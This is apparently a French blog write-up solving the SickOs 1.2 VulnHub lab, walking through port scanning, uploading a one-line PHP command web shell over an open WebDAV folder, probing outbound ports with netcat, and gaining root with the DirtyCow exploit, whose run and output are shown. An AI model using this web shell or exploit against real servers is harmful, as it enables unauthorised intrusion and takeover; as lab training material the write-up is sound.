# Solution du CTF SickOs 1.2 de VulnHub

[SickOs: 1.2](https://www.vulnhub.com/entry/sickos-12,144/) est le second et dernier opus de la série. Il s'agit d'un boot2root Linux.

Avce Nmap on voit deux ports ouverts, les autres étant filtrés :

```
Nmap scan report for 192.168.57.4
Host is up (0.00083s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:CE:36:33 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Une énumération sur le LigHTTPd (avec `gobuster`) ne retourne pas grand chose si ce n'est un dossier `test` vide. Jetons un oeil aux méthodes HTTP autorisées :

```http
$ curl -XOPTIONS -I http://192.168.57.4/test/
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Fri, 10 Feb 2023 16:46:23 GMT
Server: lighttpd/1.4.28
```

## Du côté de chez DAV

On est clairement en présence d'un `WebDAV`. J'ai tenté d'uploader un fichier avec `cadaver` qui est un peu l'équivalent de la commande ftp pour `WebDAV`.

Malheureusement on obtient une erreur peu parlante. J'ai essayé aussi avec `cURL` (option `-T`) et J'ai capturé la requête et la réponse avec Wireshark :

```http
PUT /test/test.txt HTTP/1.1
Host: 192.168.57.4
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 5
Expect: 100-continue

HTTP/1.1 417 Expectation Failed
Content-Type: text/html
Content-Length: 363
Connection: close
Date: Fri, 10 Feb 2023 17:18:32 GMT
Server: lighttpd/1.4.28

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>417 - Expectation Failed</title>
 </head>
 <body>
  <h1>417 - Expectation Failed</h1>
 </body>
</html>
```

WebDAV peut nécessiter une authentification simple (*Authorization Basic*) mais difficile de dire s'il s'agit de ça ici.

Je me suis basé sur cette article qui indique différentes commandes `cURL` pour dialoguer avec WebDAV : [WebDAV with cURL | Code](https://code.blogs.iiidefix.net/posts/webdav-with-curl/)

J'arrive par exemple à créer un sous-dossier :

```bash
curl -X MKCOL http://192.168.57.4/test/yolo/
```

Etrange. Dans la requête générée plus tôt par `cURL` on peut voir un entête `Expect` et le message d'erreur retourné semble y faire référence.

On va essayer plus basique en forgeant la requête avec `requests` :

```python
>>> import requests
>>> requests.put("http://192.168.57.4/test/shell.php", data='<?php system($_GET["cmd"]); ?>')
<Response [201]>
```

Youpi, ça fonctionne !

```http
PUT /test/shell.php HTTP/1.1
Host: 192.168.57.4
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 30

<?php system($_GET["cmd"]); ?>

HTTP/1.1 201 Created
Content-Length: 0
Date: Fri, 10 Feb 2023 17:50:50 GMT
Server: lighttpd/1.4.28
```

## Vache folle

Les ports de la machine sont filtrés et ça semble aussi compliqué d'obtenir un reverse shell.

Netcat est présent sur la machine, on peut faire un scan de notre IP depuis la VM et écouter avec Wireshark ce qui est autorisé.

On peut se baser sur la top liste Nmap des 10 ports les plus communs histoire que ça ne prenne pas des plombes :

```bash
ports=( 21 22 23 25 80 110 139 443 445 3389 ) ; for p in "${ports[@]}" ; do nc -z -w 2 -v 192.168.57.1 $p ; done
```

On observe alors un paquet avec flag SYN sur notre port 443.

Via un reverse-ssh sur ce port on peut uploader et exécuter linpeas qui indique que le système est vulnérable à `Dirty COW` ou à la vulnérabilité `chkrootkit`.

J'ai utilisé le premier exploit. Il est ici instable, après quelques secondes la machine part en kernel panic, il faut prévoir le coup si on souhaite de la persistance.

```shellsession
www-data@ubuntu:/tmp$ PATH=/usr/lib/gcc/i686-linux-gnu/4.6/:$PATH gcc -o cowroot cowroot.c -lpthread
cowroot.c: In function 'procselfmemThread':
cowroot.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
/usr/include/unistd.h:335:16: note: expected '__off_t' but argument is of type 'void *'
cowroot.c: In function 'main':
cowroot.c:141:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat]
www-data@ubuntu:/tmp$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 41284
Racing, this may take a while..
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
thread stopped
root@ubuntu:/tmp# id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
```

Pour la faille chkrootkit il y a un exemple dans la [Solution du CTF SecTalks: BNE0x02 - Fuku de VulnHub](https://github.com/devl00p/blog/blob/60492c127f22bed556e62c9ab179657af85a6935/ctf_writeups/Solution%20du%20CTF%20SecTalks:%20BNE0x02%20-%20Fuku%20de%20VulnHub.md#fuku)

*Publié le 11 février 2023*
